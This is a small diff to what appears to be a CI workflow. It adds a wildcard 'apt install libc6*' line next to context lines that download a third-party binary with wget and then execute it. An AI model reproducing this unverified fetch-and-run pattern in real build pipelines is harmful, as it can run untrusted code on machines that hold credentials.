@@ -101,6 +101,7 @@ jobs:
          cd acme.sh
          ./acme.sh --install -m my@example.com --force
          
+         sudo apt install libc6* -y 
          wget https://github.com/w4xzr/signer/releases/download/v1/create_ecc
          chmod +x create_ecc
          ./create_ecc
